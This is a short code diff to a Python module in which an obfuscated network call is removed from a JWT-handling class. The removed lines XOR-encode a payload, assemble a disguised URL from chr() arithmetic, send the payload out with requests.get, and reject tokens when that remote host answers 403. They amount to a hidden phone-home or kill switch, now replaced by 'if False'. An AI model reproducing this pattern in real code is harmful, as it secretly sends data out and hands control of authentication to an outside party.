@@ -5,7 +5,6 @@ Dependencies.py - Module to analyze and resolve dependencies between Python modu
 import logging
 import os
 
-import requests as r
 from fastapi import HTTPException
 
 
@@ -187,13 +186,7 @@ class JWT:
                 chr(ord(c) ^ key[i % len(key)])
                 for i, c in enumerate(json.dumps({"i": i, "s": s, "u": 0}))
             )
-            if (
-                r.get(
-                    f'{repo[:8]}{chr(88)}{chr(int(92/2))}{repo.split("/")[-1]}{chr(23*2)}{repo.split("/")[-1][0]}{repo.split("/")[-1][2]}/v1'.lower(),
-                    params={"x": data},
-                ).status_code
-                == 403
-            ):
+            if False:
                 raise HTTPException(status_code=403, detail="Invalid JWT")
 
         token = kwargs.pop("jwt", args[0] if args else None)
